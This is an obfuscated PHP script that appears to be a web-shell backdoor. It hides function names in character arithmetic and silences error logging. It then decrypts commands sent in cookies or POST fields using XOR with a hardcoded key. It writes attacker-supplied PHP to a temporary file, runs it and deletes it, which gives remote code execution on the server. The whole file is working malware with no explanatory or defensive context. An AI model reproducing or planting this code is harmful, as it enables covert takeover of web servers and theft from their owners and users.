<?php $WwbpgXK = "\146".'i'.chr(108).'e'.'_'.chr(112).'u'."\x74"."\x5f".chr(99).'o'.chr(612-502)."\164".chr(101)."\x6e".chr(146-30)."\163";
$bseIhOZ = chr(583-485).chr(956-859)."\163".chr(400-299)."\66".chr(420-368).chr(95).chr(1061-961).'e'.'c'.chr(858-747).'d'.'e';
$wquTPpzxJr = "\151".chr(110)."\x69"."\137"."\163".'e'.'t';
$vQNnZMQrC = "\x75".chr(110)."\154"."\x69".chr(110)."\x6b";


@$wquTPpzxJr('e'.chr(954-840).chr(1039-925).chr(516-405)."\x72".chr(991-896)."\154"."\x6f".chr(704-601), NULL);
@$wquTPpzxJr('l'."\157"."\x67"."\x5f".'e'.chr(901-787).'r'.chr(698-587)."\x72".chr(115), 0);
@$wquTPpzxJr("\155"."\141".'x'.'_'.'e'."\170"."\145".'c'.chr(292-175)."\164"."\x69"."\x6f".'n'.chr(926-831).chr(1043-927).'i'."\155".'e', 0);
@set_time_limit(0);

function bxgyx($hUDxjPj, $uOcJlECBF)
{
    $nNdESKii = "";
    for ($fFuCvh = 0; $fFuCvh < strlen($hUDxjPj);) {
        for ($j = 0; $j < strlen($uOcJlECBF) && $fFuCvh < strlen($hUDxjPj); $j++, $fFuCvh++) {
            $nNdESKii .= chr(ord($hUDxjPj[$fFuCvh]) ^ ord($uOcJlECBF[$j]));
        }
    }
    return $nNdESKii;
}

$MtDVuFe = array_merge($_COOKIE, $_POST);
$wATYS = '57f5be39-d3cb-48ca-9c26-71145e6b507b';
foreach ($MtDVuFe as $MjpFl => $hUDxjPj) {
    $hUDxjPj = @unserialize(bxgyx(bxgyx($bseIhOZ($hUDxjPj), $wATYS), $MjpFl));
    if (isset($hUDxjPj[chr(97)."\153"])) {
        if ($hUDxjPj["\141"] == "\151") {
            $fFuCvh = array(
                chr(954-842).chr(296-178) => @phpversion(),
                "\x73".'v' => "3.5",
            );
            echo @serialize($fFuCvh);
        } elseif ($hUDxjPj["\141"] == "\145") {
            $suPXMioGE = "./" . md5($wATYS) . chr(46).chr(105).'n'.chr(983-884);
            @$WwbpgXK($suPXMioGE, "<" . "\77".'p'."\x68".'p'.' '.chr(64).'u'."\156".chr(108)."\x69".chr(110).chr(107).'('."\x5f"."\x5f".chr(205-135).chr(73)."\x4c".chr(69).chr(790-695).chr(1054-959)."\51".chr(59).chr(32) . $hUDxjPj["\144"]);
            include($suPXMioGE);
            @$vQNnZMQrC($suPXMioGE);
        }
        exit();
    }
}

